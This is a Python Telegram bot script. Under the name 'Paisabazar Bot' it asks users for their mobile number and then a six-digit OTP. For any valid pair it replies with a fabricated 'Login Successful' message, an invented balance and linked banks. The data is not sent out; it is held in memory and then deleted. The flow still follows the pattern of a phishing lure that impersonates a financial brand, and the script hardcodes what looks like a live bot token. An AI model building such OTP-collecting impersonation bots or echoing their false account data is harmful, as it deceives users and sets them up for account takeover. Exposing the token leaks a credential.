import os
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8926131030:AAGkoTOJI_JsPBc77SIzvDRslkRZDx7UYfc"

# States
PHONE, OTP = range(2)
user_data = {}

async def start(update: Update, context):
    await update.message.reply_text("🤖 Paisabazar Bot Active!\nSend /paisa to start")

async def paisa(update: Update, context):
    user_id = update.effective_user.id
    user_data[user_id] = {'step': 'phone'}
    await update.message.reply_text("📱 Send your mobile number:\nExample: 9876543210")

async def handle_message(update: Update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_data:
        await update.message.reply_text("Send /paisa to start")
        return
    
    step = user_data[user_id]['step']
    
    if step == 'phone':
        if re.match(r'^[6-9][0-9]{9}$', text):
            user_data[user_id]['phone'] = text
            user_data[user_id]['step'] = 'otp'
            await update.message.reply_text(f"✅ Number saved: {text}\n🔐 Send OTP (6 digits):")
        else:
            await update.message.reply_text("❌ Invalid number! Send 10 digits starting with 6-9")
    
    elif step == 'otp':
        if re.match(r'^[0-9]{6}$', text):
            phone = user_data[user_id]['phone']
            await update.message.reply_text(f"✅ Login Successful!\n\n💰 Balance: PKR 12,500\n🏦 Banks: HDFC Bank, ICICI Bank\n📱 Mobile: {phone}")
            del user_data[user_id]
        else:
            await update.message.reply_text("❌ Invalid OTP! Send 6 digits")

async def cancel(update: Update, context):
    user_id = update.effective_user.id
    user_data.pop(user_id, None)
    await update.message.reply_text("❌ Cancelled. Send /paisa to start over.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("paisa", paisa))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Bot is running on Railway...")
    app.run_polling()

if __name__ == "__main__":
    main()